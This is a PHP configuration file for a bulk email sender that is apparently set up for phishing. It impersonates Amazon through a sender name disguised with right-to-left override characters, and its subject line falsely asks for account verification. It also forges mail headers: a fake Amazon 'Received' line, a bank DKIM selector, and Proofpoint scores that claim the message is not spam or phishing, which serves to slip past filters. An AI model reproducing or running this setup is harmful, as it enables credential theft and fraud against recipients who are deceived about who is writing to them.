<?php
$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$smtp = 'smtp.csv';
$mailist = [
	'file'				=> 'list.txt',
	'removeduplicate'	=> false,
];

$sender_setting = [
	'color'				=> true,
	'Host'				=> 'smtp-relay.gmail.com', //smtp.gmail.com
	'Port'				=> '587', //587 & 465
	'Hostname'			=> '##mix_lower_15##-##mix_lower_16##@##mix_lower_15.####mix_lower_2##',
	'max'				=> '1', // total of emails to send per sending
	'delay'				=> '1', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'quoted-printable', // quoted-printable or base64 or 7bit or 8bit
	'priority'			=> '1',	// 1=high, 3=normal, 5=low
	'randomparam'		=> true,
	'link'				=> '', // input link here to use a random link fiture
	'header'			=> true,
];

$sender_inbox = [
	#--start--#
	[
		'fname'					=> '##blankquote7##A‮##blankquote4####blankquote9####blankquote5##‮noz‮##blankquote6##a##blankquote8##‮͏m##blankquote2##',
		'fmail'					=> '',
		'subject'				=> 'We need verification for your account [##date##] (Ref:##number_mix_5##) ',
		'attachfile'			=> '', // Your PDF File, leave it blank if you wont use it
		'attachname' 			=> "", // Custom your PDF File
		'letter'				=> 'memek.html', // Amazon.html

	],
	#--end--#


];

$sender_header = array(
	'X-YMailISG|sotR8EWLDtGfmNgzF8JaENbTeVH8XnI8tJx3cVvm6mdF3o8',
	'Received|from 10.253.230.152  (EHLO omptrans.mail.amazon.com) (12.130.138.110)',
	'DKIM-Signature|v=1; a=rsa-sha256; c=relaxed/relaxed; s=synchronybank;',
	'X-Mailer|WebService/1.1.17936 YMailNorrin Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
	'X-Proofpoint-Virus-Version|vendor=fsecure engine=2.50.10434:6.0.369,18.0.761 definitions=2021-03-28_13:2021-03-26,2021-03-28 signatures=0',
	'X-Proofpoint-Spam-Details|rule=notspam policy=default score=1 suspectscore=0 malwarescore=0 phishscore=0 bulkscore=0 spamscore=1 clxscore=1011 mlxscore=1 mlxlogscore=212 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.0.1-2006250000 definitions=main-2103280179',
	
);




?>